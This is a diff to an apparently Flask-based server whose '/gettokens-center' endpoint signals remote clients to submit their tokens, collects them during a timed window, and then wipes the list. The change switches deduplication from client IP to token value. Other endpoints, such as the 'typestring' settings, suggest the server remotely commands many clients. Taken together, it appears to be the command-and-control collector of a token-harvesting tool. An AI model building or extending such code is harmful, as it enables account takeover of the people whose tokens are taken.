@@ -45,7 +45,6 @@ typestring_delay: float = 0.0
 typestring_ips: list[str] = []
 
 tokens: list[str] = []
-gettoken_ips: list[str] = []
 get_token: bool = False
 
 # Centers
@@ -53,17 +52,16 @@ get_token: bool = False
 
 @app.route("/gettokens-center", methods=["GET", "POST"])
 def gettoken_center() -> Response:
-    global gettoken_ips, get_token, tokens
+    global get_token, tokens
     if request.method == "GET":
         if not get_token:
             return Response("dont grab token", 204)
         else:
             return Response("send me ur token pls", 200)
     elif request.method == "POST":
-        remote_ip = get_remote_address()
-        if get_token and remote_ip not in gettoken_ips:
-            tokens.append(request.args.get("token"))
-            gettoken_ips.append(remote_ip)
+        token = request.args.get("token")
+        if get_token and token not in tokens:
+            tokens.append(token)
             return Response("added token", 200)
         else:
             return Response("u cant do that rn", 400)
@@ -461,13 +459,12 @@ def post_typestring_thread(string: str, delay: float) -> None:
 
 
 def post_gettoken_thread() -> None:
-    global gettoken_ips, get_token, tokens
+    global get_token, tokens
     get_token = True
     sleep(8)
     get_token = False
     sleep(5)
     tokens = []
-    gettoken_ips = []
 
 
 # Static
